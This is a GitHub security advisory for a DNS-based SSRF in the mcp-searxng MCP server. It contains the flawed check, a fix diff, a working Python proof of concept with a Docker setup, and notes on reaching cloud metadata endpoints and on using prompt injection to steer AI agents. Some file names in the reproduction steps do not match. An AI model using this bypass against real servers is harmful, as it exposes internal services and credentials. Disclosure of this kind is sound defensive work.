# [H]  SearXNG MCP Server: DNS-resolved Private Hostname SSRF in `web_url_read`

## Summary
Severity: High
Advisory: GHSA-mrvx-jmjw-vggc
CWE: CWE-918
Ecosystem: npm
CVSS: CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N (CVSS_V3)
Published: 2026-06-19
Source: https://github.com/advisories/GHSA-mrvx-jmjw-vggc
Type: github-advisory

## Affected
- npm: `mcp-searxng` — affected >=0 <1.7.1

## Details
## DNS-resolved Private Hostname SSRF in `web_url_read`

### Summary

The `web_url_read` MCP tool in `mcp-searxng` is vulnerable to Server-Side Request Forgery (SSRF) via DNS rebinding bypass. The `assertUrlAllowed()` function at `src/url-reader.ts:85-93` validates only the syntactic hostname string against a private IP/hostname blocklist without performing DNS resolution. An attacker who controls a domain that resolves to a private or loopback IP address (e.g., via a wildcard DNS service like `nip.io`, or a custom DNS entry) can bypass the security check and cause the MCP server to read arbitrary internal HTTP services reachable from the server host. This allows exfiltration of sensitive data from internal services with no authentication required in the default HTTP configuration.

### Details

The vulnerable code is in `src/url-reader.ts`, where the `assertUrlAllowed()` function performs a hostname-only string comparison:

```ts
// src/url-reader.ts:85-93
function assertUrlAllowed(url: URL): void {
  const security = getHttpSecurityConfig();
  if (security.allowPrivateUrls) {
    return;
  }

  if (isPrivateHostname(url.hostname) || isPrivateIpv4(url.hostname) || isPrivateIPv6(url.hostname)) {
    throw createURLSecurityPolicyError(url.toString());
  }
}
```

This function checks whether `url.hostname` lexically matches a private address pattern but never resolves the hostname via DNS. The OS-level DNS resolution happens later, inside `undiciFetch()` at `src/url-reader.ts:367`, after the security gate has already passed.

The full data flow is:

1. `src/index.ts:37-49` — `isWebUrlReadArgs()` accepts `args.url` as any string value with no URL policy enforcement.
2. `src/index.ts:226-240` — `web_url_read` passes `args.url` directly to `fetchAndConvertToMarkdown()`.
3. `src/url-reader.ts:307-313` — URL is parsed and `assertUrlAllowed(parsedUrl)` is called (string check only).
4. `src/url-reader.ts:85-93` — `assertUrlAllowed()` checks `url.hostname` as a string; no DNS resolution is performed.
5. `src/url-reader.ts:367` — `undiciFetch(currentUrl.toString(), currentRequestOptions)` resolves the hostname via OS DNS and connects to the resolved IP, which may be a private or loopback address.

In the default HTTP mode (`MCP_HTTP_HARDEN` unset), `requireAuth` is `false` (see `src/http-security.ts:30-41`), meaning no authentication is required to invoke `web_url_read`.

The recommended remediation is to resolve the hostname via `node:dns/promises` inside `assertUrlAllowed()` before the fetch is issued:

```diff
--- a/src/url-reader.ts
+++ b/src/url-reader.ts
@@
 import { isIP } from "node:net";
+import { lookup } from "node:dns/promises";
@@
-function assertUrlAllowed(url: URL): void {
+async function assertUrlAllowed(url: URL): Promise<void> {
   const security = getHttpSecurityConfig();
   if (security.allowPrivateUrls) {
     return;
   }
+  if (!["http:", "https:"].includes(url.protocol)) {
+    throw createURLSecurityPolicyError(url.toString());
+  }

   if (isPrivateHostname(url.hostname) || isPrivateIpv4(url.hostname) || isPrivateIPv6(url.hostname)) {
     throw createURLSecurityPolicyError(url.toString());
   }
+  if (isIP(url.hostname) === 0) {
+    const answers = await lookup(url.hostname, { all: true, verbatim: true });
+    if (answers.some(({ address }) => isPrivateIpv4(address) || isPrivateIPv6(address))) {
+      throw createURLSecurityPolicyError(url.toString());
+    }
+  }
 }
@@
-  assertUrlAllowed(parsedUrl);
+  await assertUrlAllowed(parsedUrl);
@@
-        assertUrlAllowed(nextUrl);
+        await assertUrlAllowed(nextUrl);
```

### PoC

**Prerequisites:**

- Docker installed on the test machine.
- The `mcp-searxng` repository cloned locally (version 1.6.0 / commit `90423e5`).

**Build the container:**

```bash
docker build -t mcp-searxng-ssrf-001 -f vuln-001/Dockerfile .
```

**Run the PoC:**

```bash
docker run --rm \
  --add-host ssrf-target.internal:127.0.0.1 \
  -v $(pwd)/vuln-001/poc.py:/poc.py \
  mcp-searxng-ssrf-001 \
  python3 /poc.py
```

The `--add-host` flag maps `ssrf-target.internal` to `127.0.0.1` inside the container, simulating a DNS-resolved private hostname (equivalent to using a wildcard DNS service like `127.0.0.1.nip.io` in a real attack).

**What the PoC does:**

1. Starts a Python HTTP server on `127.0.0.1:9796` returning the sentinel value `INTERNAL-SECRET-OK-SSRF-PROOF`.
2. Starts the MCP server in STDIO mode.
3. **Test 1:** Sends a `tools/call` request for `http://127.0.0.1:9796/` — this is correctly **blocked** by `assertUrlAllowed()`.
4. **Test 2:** Sends a `tools/call` request for `http://ssrf-target.internal:9796/` — this **bypasses** the check because the hostname is syntactically public, but resolves to `127.0.0.1` at fetch time.

**Expected output (confirming SSRF):**

```
[+] BLOCKED  — assertUrlAllowed() correctly rejected 127.0.0.1
[!!!] SSRF BYPASS CONFIRMED
[!!!] Sentinel 'INTERNAL-SECRET-OK-SSRF-PROOF' found in MCP tool response
    Raw tool response text: 'INTERNAL-SECRET-OK-SSRF-PROOF'
    URL: http://ssrf-target.internal:9796/ (resolves to 127.0.0.1 via /etc/hosts)
    assertUrlAllowed() sees hostname='ssrf-target.internal' → passes string check
    undiciFetch() resolves DNS → 127.0.0.1 → reads internal service
[RESULT] PASS
```

The same bypass can be achieved in production using any public DNS wildcard service that resolves to a private IP (e.g., `http://127.0.0.1.nip.io:PORT/`), or by controlling a custom DNS record.

**MCP JSON-RPC request (STDIO mode):**

```json
{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"web_url_read","arguments":{"url":"http://ssrf-target.internal:9796/","maxLength":200}}}
```

### Impact

This is a Server-Side Request Forgery (SSRF) vulnerability. An attacker who can send requests to the MCP server — or who can influence an AI agent connected to the server to call `web_url_read` with an attacker-controlled URL — can:

- **Read internal HTTP services** reachable from the MCP server host (e.g., cloud metadata endpoints at `169.254.169.254`, internal APIs, admin dashboards, databases with HTTP interfaces).
- **Exfiltrate sensitive data** such as cloud provider credentials, internal service tokens, or configuration secrets.
- **Enumerate internal network topology** by probing responses from different internal hosts and ports.

In the default HTTP deployment configuration (`MCP_HTTP_HARDEN` unset), authentication is disabled (`requireAuth: false`), so any unauthenticated network client can exploit this vulnerability. In STDIO mode, exploitation requires the AI agent connected to the MCP server to be tricked into providing an attacker-controlled URL, which is feasible via prompt injection or malicious content fetched from the web.

The vulnerability has a CVSS v3.1 score of **7.1 (High)** and affects all users running `mcp-searxng` version 1.6.0 without setting `MCP_HTTP_ALLOW_PRIVATE_URLS=false` explicitly overriding to true (the insecure opt-in) or applying a patched version.

### Reproduction artifacts

#### `Dockerfile`

```dockerfile
FROM node:20-slim

# Install Python3 for the PoC script
RUN apt-get update && apt-get install -y --no-install-recommends python3 && rm -rf /var/lib/apt/lists/*

WORKDIR /app

# Copy the entire repository
COPY . /app/

# Install dependencies and compile TypeScript
RUN npm ci && npm run build

# Verify the build output exists
RUN test -f dist/index.js || (echo "ERROR: dist/index.js not found after build" && exit 1)

# Default: drop into a shell for manual inspection; overridden by docker run
CMD ["node", "dist/index.js"]
```

#### `poc.py`

```python
#!/usr/bin/env python3
"""
PoC for VULN-001: DNS-resolved Private Hostname SSRF in web_url_read
CWE-918 | CVSS 7.1

The assertUrlAllowed() function (src/url-reader.ts:85-93) checks only the
url.hostname string against private IP/hostname patterns without performing DNS
resolution.  A hostname that is syntactically public but resolves to a private
or loopback address at fetch time bypasses the check.

Attack flow:
  1. Attacker provides URL with a hostname that passes the string check.
  2. assertUrlAllowed(parsedUrl) at line 313 passes (no DNS resolution).
  3. undiciFetch() at line 367 resolves the hostname via OS DNS, gets 127.0.0.1,
     and connects to the internal service.

Requirements:
  - Container must be started with --add-host ssrf-target.internal:127.0.0.1
    so that the bypass hostname resolves to the loopback address via /etc/hosts.
  - Node.js MCP server binary at /app/dist/index.js

Usage:
  python3 poc.py
  Exit 0 = PASS (bypass confirmed), non-zero = FAIL
"""

import http.server
import json
import os
import queue
import subprocess
import sys
import threading
import time

# ── constants ────────────────────────────────────────────────────────────────

SENTINEL       = "INTERNAL-SECRET-OK-SSRF-PROOF"
INTERNAL_PORT  = 9796
BYPASS_HOST    = "ssrf-target.internal"   # /etc/hosts: 127.0.0.1 (via --add-host)
MCP_BINARY     = "/app/dist/cli.js"
TIMEOUT_SEC    = 20


# ── internal HTTP server ─────────────────────────────────────────────────────

class SentinelHandler(http.server.BaseHTTPRequestHandler):
    """Simulates an internal service that the SSRF attack reads."""

    def _send_sentinel(self, with_body=True):
        body = (SENTINEL + "\n").encode()
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        if with_body:
            self.wfile.write(body)

    def do_GET(self):
        self._send_sentinel(with_body=True)

    def do_HEAD(self):
        self._send_sentinel(with_body=False)

    def log_message(self, fmt, *args):   # silence access log
        pass


def start_internal_server():
    server = http.server.HTTPServer(("127.0.0.1", INTERNAL_PORT), SentinelHandler)
    threading.Thread(target=server.serve_forever, daemon=True).start()
    print(f"[+] Internal HTTP server listening on 127.0.0.1:{INTERNAL_PORT}"
          f'  -> sentinel: "{SENTINEL}"')
    return server


# ── MCP communication helpers ─────────────────────────────────────────────────

def start_mcp_server():
    """Spawn the MCP server in STDIO mode."""
    env = os.environ.copy()
    env.update({
        "NODE_ENV": "production",
        # SEARXNG_URL is intentionally unset; web_url_read does not need it.
    })
    proc = subprocess.Popen(
        ["node", MCP_BINARY],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        env=env,
    )
    return proc


def drain_stderr(proc):
    """Drain stderr in a background thread to prevent blocking."""
    def _reader():
        for _ in proc.stderr:
            pass
    threading.Thread(target=_reader, daemon=True).start()


def attach_stdout_reader(proc):
    """Return a queue that receives decoded JSON-RPC messages from stdout."""
    q = queue.Queue()

    def _reader():
        for raw in proc.stdout:
            line = raw.strip()
            if not line:
                continue
            try:
                q.put(json.loads(line.decode()))
            except json.JSONDecodeError:
                pass   # skip non-JSON output

    threading.Thread(target=_reader, daemon=True).start()
    return q


def send_rpc(proc, method, params=None, rpc_id=None):
    """Write one JSON-RPC 2.0 message to the MCP server's stdin."""
    msg = {"jsonrpc": "2.0", "method": method}
    if rpc_id is not None:
        msg["id"] = rpc_id
    if params is not None:
        msg["params"] = params
    proc.stdin.write((json.dumps(msg) + "\n").encode())
    proc.stdin.flush()


def expect_response(q, target_id, timeout=TIMEOUT_SEC):
    """Wait for a JSON-RPC response matching target_id."""
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            msg = q.get(timeout=1.0)
            if msg.get("id") == target_id:
                return msg
        except queue.Empty:
            continue
    return None


def initialize_mcp(proc, q):
    """Perform the MCP initialize / initialized handshake."""
    send_rpc(proc, "initialize", {
        "protocolVersion": "2024-11-05",
        "capabilities": {},
        "clientInfo": {"name": "ssrf-poc", "version": "1.0"},
    }, rpc_id=1)

    resp = expect_response(q, target_id=1)
    if resp is None or "result" not in resp:
        raise RuntimeError(f"MCP initialize timed out or failed: {resp}")

    proto = resp["result"].get("protocolVersion", "?")
    print(f"[+] MCP handshake complete (protocol={proto})")

    # Acknowledge initialization
    send_rpc(proc, "notifications/initialized")
    time.sleep(0.15)


def call_url_read(proc, q, url, rpc_id):
    """Invoke the web_url_read tool and return the raw JSON-RPC response."""
    send_rpc(proc, "tools/call", {
        "name": "web_url_read",
        "arguments": {"url": url, "maxLength": 600},
    }, rpc_id=rpc_id)
    return expect_response(q, target_id=rpc_id)


# ── result helpers ────────────────────────────────────────────────────────────

def extract_text(resp):
    """Return the text content from a tools/call result, or None."""
    if resp is None:
        return None
    if "error" in resp:
        return None
    try:
        return resp["result"]["content"][0]["text"]
    except (KeyError, IndexError, TypeError):
        return None


def is_blocked(resp):
    """Return True when the response indicates a security-policy block."""
    if resp is None:
        return False
    # MCP SDK may surface tool errors as JSON-RPC errors OR as isError results
    if "error" in resp:
        return True
    text = extract_text(resp) or ""
    if resp.get("result", {}).get("isError"):
        return True
    if "URLSecurityPolicy" in text or "not allowed" in text.lower():
        return True
    return False


# ── main ──────────────────────────────────────────────────────────────────────

def main():
    print("=" * 62)
    print("VULN-001  DNS-resolved Private Hostname SSRF in web_url_read")
    print("=" * 62)

    # 1. Verify /etc/hosts entry is present
    bypass_url = f"http://{BYPASS_HOST}:{INTERNAL_PORT}/"
    with open("/etc/hosts") as f:
        hosts_content = f.read()
    if BYPASS_HOST not in hosts_content:
        print(f"[-] FATAL: '{BYPASS_HOST}' not in /etc/hosts.")
        print("    Re-run with: --add-host ssrf-target.internal:127.0.0.1")
        sys.exit(3)
    print(f"[+] /etc/hosts contains entry for {BYPASS_HOST}")

    # 2. Start internal HTTP service
    start_internal_server()
    time.sleep(0.2)

    # 3. Start MCP server
    print(f"[*] Spawning MCP server: node {MCP_BINARY}")
    proc = start_mcp_server()
    drain_stderr(proc)
    msg_queue = attach_stdout_reader(proc)
    time.sleep(1.2)   # allow server startup

    if proc.poll() is not None:
        print(f"[-] MCP server exited early (rc={proc.returncode})")
        sys.exit(4)
    print(f"[+] MCP server running (PID={proc.pid})")

    try:
        # 4. MCP handshake
        print("[*] MCP initialize ...")
        initialize_mcp(proc, msg_queue)

        # ── Test 1: direct private IP should be BLOCKED ───────────────────
        blocked_target = f"http://127.0.0.1:{INTERNAL_PORT}/"
        print(f"\n[*] Test 1 — direct private IP (EXPECT: BLOCKED)")
        print(f"    URL: {blocked_target}")
        resp1 = call_url_read(proc, msg_queue, blocked_target, rpc_id=2)
        text1 = extract_text(resp1) or ""

        if is_blocked(resp1):
            print(f"[+] BLOCKED  — assertUrlAllowed() correctly rejected 127.0.0.1")
        else:
            print(f"[!] WARNING — direct 127.0.0.1 was NOT blocked (text={text1[:120]})")

        # ── Test 2: hostname bypass SHOULD succeed ─────────────────────────
        print(f"\n[*] Test 2 — hostname bypass (EXPECT: PASS / SSRF)")
        print(f"    URL: {bypass_url}")
        print(f"    assertUrlAllowed() sees hostname='{BYPASS_HOST}' → passes string check")
        print(f"    undiciFetch() resolves DNS → 127.0.0.1 → reads internal service")
        resp2 = call_url_read(proc, msg_queue, bypass_url, rpc_id=3)
        text2 = extract_text(resp2) or ""

        print(f"\n    Raw tool response text (first 400 chars):")
        print(f"    {repr(text2[:400])}")

        if SENTINEL in text2:
            print(f"\n[!!!] SSRF BYPASS CONFIRMED")
            print(f"[!!!] Sentinel '{SENTINEL}' found in MCP tool response")
            print(f"\n[RESULT] PASS")
            sys.exit(0)
        elif is_blocked(resp2):
            print(f"\n[-] Bypass request was also BLOCKED (unexpected).")
            print(f"    resp2={json.dumps(resp2)[:300]}")
            print(f"\n[RESULT] FAIL — bypass was blocked")
            sys.exit(1)
        else:
            print(f"\n[-] Response received but sentinel not found.")
            print(f"    resp2={json.dumps(resp2)[:400]}")
            print(f"\n[RESULT] FAIL — unexpected response")
            sys.exit(1)

    finally:
        proc.terminate()


if __name__ == "__main__":
    main()
```

## References
- https://github.com/ihor-sokoliuk/mcp-searxng/security/advisories/GHSA-mrvx-jmjw-vggc
- https://github.com/ihor-sokoliuk/mcp-searxng
